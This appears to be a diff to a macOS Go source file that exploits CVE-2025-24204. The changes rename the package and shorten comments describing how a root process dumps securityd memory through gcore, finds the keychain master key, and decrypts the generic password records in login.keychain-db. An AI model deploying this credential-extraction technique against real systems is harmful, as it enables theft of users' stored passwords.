@@ -1,16 +1,10 @@
 //go:build darwin
 
-package keyretriever
+package keys
 
-// CVE-2025-24204: macOS securityd TCC bypass via gcore.
-// The gcore binary holds the com.apple.system-task-ports.read entitlement,
-// allowing any root process to dump securityd memory without a TCC prompt.
-// We scan the dump for the 24-byte keychain master key, then use it to
-// extract browser storage passwords from login.keychain-db.
-//
-// References:
-//   - https://github.com/FFRI/CVE-2025-24204/tree/main/decrypt-keychain
-//   - https://support.apple.com/en-us/122373
+// CVE-2025-24204: gcore holds the com.apple.system-task-ports.read entitlement, so a root process can
+// dump securityd memory without a TCC prompt; we scan the dump for the 24-byte keychain master key.
+// PoC: https://github.com/FFRI/CVE-2025-24204/tree/main/decrypt-keychain
 
 import (
 	"debug/macho"
@@ -66,9 +60,8 @@ type addressRange struct {
 	end   uint64
 }
 
-// DecryptKeychainRecords extracts all generic password records from login.keychain-db
-// by dumping securityd memory and scanning for the keychain master key.
-// Requires root privileges.
+// DecryptKeychainRecords dumps securityd memory, scans for the keychain master key, and uses it to
+// read login.keychain-db's generic password records. Requires root.
 func DecryptKeychainRecords() ([]keychainbreaker.GenericPassword, error) {
 	if os.Geteuid() != 0 {
 		return nil, errors.New("requires root privileges")
@@ -216,8 +209,7 @@ func findMallocSmallRegions(pid int) ([]addressRange, error) {
 	return regions, nil
 }
 
-// getMallocSmallRegionData finds the Mach-O segment matching the given
-// address range and returns its raw data and virtual address.
+// getMallocSmallRegionData returns the Mach-O segment data + vaddr for the given address range.
 func getMallocSmallRegionData(f *macho.File, region addressRange) ([]byte, uint64, error) {
 	for _, seg := range f.Loads {
 		if s, ok := seg.(*macho.Segment); ok {
